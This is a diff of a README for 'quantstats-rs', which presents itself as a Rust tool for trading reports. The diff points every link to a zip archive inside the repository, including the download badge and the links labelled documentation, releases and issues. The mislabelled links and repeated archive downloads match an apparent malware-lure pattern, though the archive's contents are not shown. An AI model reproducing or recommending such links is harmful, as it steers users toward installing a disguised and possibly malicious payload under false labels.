@@ -1,6 +1,6 @@
 # 🚀 quantstats-rs - Effortlessly Generate Trading Performance Reports
 
-![Download quantstats-rs](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
+![Download quantstats-rs](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip)
 
 ## 📦 Overview
 
@@ -35,7 +35,7 @@ To get started with **quantstats-rs**, ensure your system meets the following re
 
 To download **quantstats-rs**, visit this page:
 
-[Download quantstats-rs](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
+[Download quantstats-rs](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip)
 
 Follow these steps to get started:
 
@@ -63,7 +63,7 @@ If you need help using **quantstats-rs**, check our detailed documentation. It c
 - User Manual
 - FAQ Section
 
-All documentation can be found on the [Teardown Documentation Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip).
+All documentation can be found on the [Teardown Documentation Page](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip).
 
 ## 🛠️ Contribute
 
@@ -83,9 +83,9 @@ Stay updated with the latest changes by reviewing our changelog. It provides det
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
-- [Documentation](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
-- [Issues Page](https://raw.githubusercontent.com/akkayahmet1/quantstats-rs/main/scripts/quantstats-rs_v2.7.zip)
+- [Releases Page](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip)
+- [Documentation](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip)
+- [Issues Page](https://github.com/akkayahmet1/quantstats-rs/raw/refs/heads/main/src/rs_quantstats_v3.9.zip)
 
 ---
 
